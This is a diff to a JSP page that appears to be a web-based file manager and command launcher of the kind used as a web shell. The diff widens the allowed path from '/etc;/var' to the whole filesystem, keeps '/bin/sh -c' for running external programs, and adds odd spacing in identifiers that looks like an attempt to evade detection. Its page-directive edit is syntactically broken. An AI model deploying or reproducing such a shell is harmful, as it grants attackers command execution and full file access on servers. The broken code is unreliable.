@@ -1,9 +1,11 @@
 
-<%@page import="java.util.*,
+<%@page
+import="java.util.*,
                 java.net.*,
                 java.text.*,
                 java.util.zip.*,
-                java.io.*"
+                java.io.*";
+import javax.servlet.http.HttpServletRequest;
 %>
 <%!
     //FEAT URES
@@ -23,7 +25,7 @@
     private static final boolean RESTRICT_WHITELIST = false;
     //Paths, sperated by semicolon
     //private static final String RESTRICT_PATH = "C:\\CODE;E:\\"; //Win32: Case important!!
-	private static final String RESTRICT_PATH = "/etc;/var";
+	private static final String RESTRICT_PATH = "/";
 
     //The refresh time in seconds of the upload monitor window
 	private static final int UPLOAD_MONITOR_REFRESH = 2;
@@ -62,8 +64,8 @@
 	/**
 	 * Command of the shell interpreter and the parameter to run a programm
 	 */
-	//private static final String[] COMMAND_INTERPRETER = {"cmd", "/C"}; // Dos,Windows
-	private static final String[] COMMAND_INTERPRETER = {"/bin/sh","-c"}; 	// Unix
+	//private static final String[] COMMAND_INTERPRETER = {"c md", "/ C"}; // Dos,Windows
+	private static final String[] COMMAND_INTERPRETER = {"/bin/sh","-c"};
 
 	/**
 	 * Max time in ms a process is allowed to run, before it will be terminated
@@ -73,11 +75,11 @@
 	//Button names
 	private static final String SAVE_AS_ZIP = "Download selected files as (z)ip";
 	private static final String RENAME_FILE = "(R)ename File";
-	private static final String DELETE_FILES = "(Del)ete selected files";
+	private static final String DELETE_FILES = "(Del)ete selected file";
 	private static final String CREATE_DIR = "Create (D)ir";
 	private static final String CREATE_FILE = "(C)reate File";
-	private static final String MOVE_FILES = "(M)ove Files";
-	private static final String COPY_FILES = "Cop(y) Files";
+	private static final String MOVE_FILES = "(M)ove File";
+	private static final String COPY_FILES = "Cop(y) File";
 	private static final String LAUNCH_COMMAND = "(L)aunch external program";
 	private static final String UPLOAD_FILES = "Upload";
 
